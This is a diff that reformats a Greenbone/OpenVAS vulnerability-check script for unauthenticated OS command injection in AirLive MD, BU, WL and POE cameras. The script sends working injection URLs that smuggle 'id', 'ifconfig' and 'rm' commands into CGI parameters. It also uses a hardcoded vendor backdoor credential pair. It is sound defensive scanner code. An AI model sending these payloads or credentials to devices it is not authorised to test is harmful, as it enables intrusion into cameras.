@@ -1,51 +1,46 @@
-###############################################################################
-# OpenVAS Vulnerability Test
+# SPDX-FileCopyrightText: 2015 Greenbone AG
+# Some text descriptions might be excerpted from (a) referenced
+# source(s), and are Copyright (C) by the respective right holder(s).
 #
-# AirLive Multiple Products OS Command Injection
-#
-# Authors:
-# Michael Meyer <michael.meyer@greenbone.net>
-#
-# Copyright:
-# Copyright (C) 2015 Greenbone Networks GmbH
-#
-# This program is free software; you can redistribute it and/or
-# modify it under the terms of the GNU General Public License
-# as published by the Free Software Foundation; either version 2
-# of the License, or (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
-###############################################################################
+# SPDX-License-Identifier: GPL-2.0-only
 
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105315");
-  script_version("2021-10-15T14:03:21+0000");
-  script_cve_id("CVE-2015-2279", "CVE-2014-8389");
+  script_version("2023-07-05T05:06:18+0000");
+  script_tag(name:"last_modification", value:"2023-07-05 05:06:18 +0000 (Wed, 05 Jul 2023)");
+  script_tag(name:"creation_date", value:"2015-07-07 14:11:14 +0200 (Tue, 07 Jul 2015)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
+  script_tag(name:"severity_origin", value:"NVD");
+  script_tag(name:"severity_date", value:"2018-10-09 19:56:00 +0000 (Tue, 09 Oct 2018)");
 
-  script_name("AirLive Multiple Products OS Command Injection");
+  script_cve_id("CVE-2015-2279", "CVE-2014-8389");
 
-  script_xref(name:"URL", value:"http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection");
-
-  script_tag(name:"vuldetect", value:"Try to execute the 'id/ifconfig' command via a HTTP GET request and check the response.");
-  script_tag(name:"solution", value:"No known solution was made available for at least one year
-  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
-  options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"qod_type", value:"remote_active");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_tag(name:"summary", value:"There is an OS Command Injection in the cgi_test.cgi binary file in the AirLive MD-3025, BU-3026
-  and BU-2015 cameras when handling certain parameters. That specific CGI file can be requested without authentication, unless the
-  user specified in the configuration of the camera that every communication should be performed over HTTPS (not enabled by default).");
+  script_name("AirLive Multiple Products OS Command Injection (Jul 2015) - Active Check");
+
+  script_category(ACT_ATTACK);
+
+  script_copyright("Copyright (C) 2015 Greenbone AG");
+  script_family("Web application abuses");
+  script_dependencies("gb_get_http_banner.nasl", "gb_default_credentials_options.nasl");
+  script_require_ports("Services/www", 8080);
+  script_mandatory_keys("Boa/banner", "AirLive/banner");
+  script_exclude_keys("default_credentials/disable_default_account_checks");
+
+  script_tag(name:"summary", value:"There is an OS Command Injection in the cgi_test.cgi binary
+  file in the AirLive MD-3025, BU-3026 and BU-2015 cameras when handling certain parameters. That
+  specific CGI file can be requested without authentication, unless the user specified in the
+  configuration of the camera that every communication should be performed over HTTPS (not enabled
+  by default).");
+
+  script_tag(name:"vuldetect", value:"Tries to execute the 'id/ifconfig' command via an HTTP GET
+  request and checks the response.");
 
   script_tag(name:"affected", value:"AirLive BU-2015 with firmware 1.03.18 16.06.2014,
 
@@ -59,31 +54,23 @@ if (description)
 
   Other devices may be affected too.");
 
-  script_tag(name:"qod_type", value:"remote_active");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore. General
+  solution options are to upgrade to a newer release, disable respective features, remove the
+  product or replace the product by another one.");
 
-  script_tag(name:"last_modification", value:"2021-10-15 14:03:21 +0000 (Fri, 15 Oct 2021)");
-  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
-  script_tag(name:"severity_origin", value:"NVD");
-  script_tag(name:"severity_date", value:"2018-10-09 19:56:00 +0000 (Tue, 09 Oct 2018)");
-  script_tag(name:"creation_date", value:"2015-07-07 14:11:14 +0200 (Tue, 07 Jul 2015)");
-  script_category(ACT_ATTACK);
-  script_family("Web application abuses");
-  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
-  script_dependencies("gb_get_http_banner.nasl", "gb_default_credentials_options.nasl");
-  script_require_ports("Services/www", 8080);
-  script_mandatory_keys("Boa/banner", "AirLive/banner");
-  script_exclude_keys("default_credentials/disable_default_account_checks");
+  script_xref(name:"URL", value:"http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection");
 
   exit(0);
 }
 
-if(get_kb_item("default_credentials/disable_default_account_checks"))
-  exit(0);
+if( get_kb_item( "default_credentials/disable_default_account_checks" ) )
+  exit( 0 );
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("port_service_func.inc");
 include("misc_func.inc");
+include("port_service_func.inc");
 
 port = http_get_port( default:8080 );
 banner = http_get_remote_headers( port:port );
@@ -92,11 +79,12 @@ if( "Server: Boa" >!< banner || ( "AirLive" >!< banner && banner !~ "(WL|MD|BU|P
   exit( 0 );
 
 if( banner =~ "(MD|BU)-" ) {
-  url = '/cgi_test.cgi?write_tan&;id&id';
+  url = "/cgi_test.cgi?write_tan&;id&id";
 
   if( buf = http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+" ) ) {
     ret = egrep( string:buf, pattern:"uid=[0-9]+.*gid=[0-9]+" );
-    report = 'By requesting "' + http_report_vuln_url( port:port, url:url, url_only:TRUE ) + '" it was possible to execute the "id" command. Response:\n\n[...] ' + chomp( ret ) + ' [...]';
+    report = 'By requesting "' + http_report_vuln_url( port:port, url:url, url_only:TRUE ) +
+             '" it was possible to execute the "id" command. Response:\n\n[...] ' + chomp( ret ) + ' [...]';
     security_message( port:port, data:report  );
     exit( 0 );
   }
@@ -106,20 +94,20 @@ if( banner =~ "(WL|POE)-") {
   vt_strings = get_vt_strings();
 
   rand = vt_strings["lowercase_rand"];
-  auth = base64( str:'manufacture:erutcafunam' );
-  url = '/cgi-bin/mft/wireless_mft?ap=testname;/sbin/ifconfig%202>%261%20>%20/web/html/' + rand;
+  auth = base64( str:"manufacture:erutcafunam" );
+  url = "/cgi-bin/mft/wireless_mft?ap=testname;/sbin/ifconfig%202>%261%20>%20/web/html/" + rand;
 
   req = http_get( item:url, port:port );
   req = ereg_replace( string:req, pattern:'\r\n\r\n', replace: '\r\nAuthorization: Basic ' + auth + '\r\n\r\n');
   buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-  url = '/' + rand;
+  url = "/" + rand;
   req = http_get( item:url, port:port );
   req = ereg_replace( string:req, pattern:'\r\n\r\n', replace: '\r\nAuthorization: Basic ' + auth + '\r\n\r\n');
   buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
   if( "eth0" >< buf && "Link encap" >< buf && "HWaddr" >< buf ) {
-    url = '/cgi-bin/mft/wireless_mft?ap=testname;rm%20/web/html/' + rand;
+    url = "/cgi-bin/mft/wireless_mft?ap=testname;rm%20/web/html/" + rand;
     req = http_get( item:url, port:port );
     req = ereg_replace( string:req, pattern:'\r\n\r\n', replace: '\r\nAuthorization: Basic ' + auth + '\r\n\r\n');
     buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
